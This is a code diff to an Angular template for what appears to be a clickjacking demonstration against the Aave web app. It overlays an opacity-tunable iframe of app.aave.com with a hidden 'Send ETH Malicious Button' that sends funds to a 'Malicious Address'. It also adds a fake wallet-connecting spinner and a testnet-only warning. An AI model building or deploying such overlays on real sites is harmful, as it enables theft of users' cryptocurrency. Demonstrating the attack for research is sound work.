@@ -1,20 +1,37 @@
 <main>
   <section class="left">
-    <iframe id="aaveIframe" (load)="handleIframeLoad()" [style.opacity]="opacity" src="https://app.aave.com">
+    <iframe id="aaveIframe" (load)="handleIframeLoad()" [style.opacity]="iframeOpacity" src="https://app.aave.com">
     </iframe>
 
-    <button class="supply-eth" *ngIf="supplyEth" (click)="sendEthToTarget()">
+    <button class="supply-eth" *ngIf="supplyEth" [style.opacity]="buttonOpacity" (click)="sendEthToTarget()">
       Send ETH Malicious Button
     </button>
+
+    <div class="spinner" *ngIf="spinner">
+      <mat-spinner></mat-spinner>
+      <h1>Connecting to Wallet. . .</h1>
+    </div>
   </section>
 
   <section class="right">
-    <!-- <mat-slider min="0" max="1" step="0.1" [(ngModel)]="opacity"></mat-slider> -->
+    <h2>⚠️ Test this only in Testnets to avoid fund loss ⚠️</h2>
+    <h3>{{accountConnectedAddress ? ('Connected to Victim Address: ' + accountConnectedAddress) : 'Not Connected'}}</h3>
+    <h3>{{'Malicious Address: ' + targetAddress}}</h3>
 
-    <div>{{accountConnectedAddress ? ('Connected to Victim Address: ' + accountConnectedAddress) : 'Not Connected'}}</div>
-    <div>{{'Malicious Address: ' + targetAddress}}</div>
-    <div>{{opacity}}</div>
-    <div>{{supplyEth}}</div>
-    <div>{{supplyClickCounter}}</div>
+    <div>
+      <span>Opacity of iframe</span>
+      <mat-slider [max]="1" [min]="0" [step]="0.1" [discrete]="true" [showTickMarks]="true">
+        <input matSliderThumb [(ngModel)]="iframeOpacity">
+      </mat-slider>
+      <span>{{iframeOpacity * 100 + ' %'}}</span>
+    </div>
+
+    <div>
+      <span>Opacity of Malicious Send Eth Button</span>
+      <mat-slider [max]="1" [min]="0" [step]="0.1" [discrete]="true" [showTickMarks]="true">
+        <input matSliderThumb [(ngModel)]="buttonOpacity">
+      </mat-slider>
+      <span>{{buttonOpacity * 100 + ' %'}}</span>
+    </div>
   </section>
 </main>
